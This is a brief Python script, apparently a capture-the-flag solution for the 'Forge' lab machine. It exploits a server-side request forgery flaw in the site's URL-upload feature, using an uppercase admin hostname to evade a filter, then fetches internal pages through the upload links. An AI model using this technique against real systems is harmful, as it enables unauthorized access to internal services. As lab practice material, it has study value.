#!/usr/bin/python3

import re
import requests

while True:
    url = input(">>> ")
    data = {"url": f"http://ADMIN.FORGE.HTB/upload?u={url}", "remote": "1"}
    r = requests.post("http://forge.htb/upload", data=data)
    try:
        url = re.findall("(http://forge.htb/uploads/.{20})", r.text)[0]
        r = requests.get(url)
        url = re.findall("(http://forge.htb/uploads/.{20})", r.text)[0]
        r = requests.get(url)
        print(r.text)
    except:
        print(r.text)
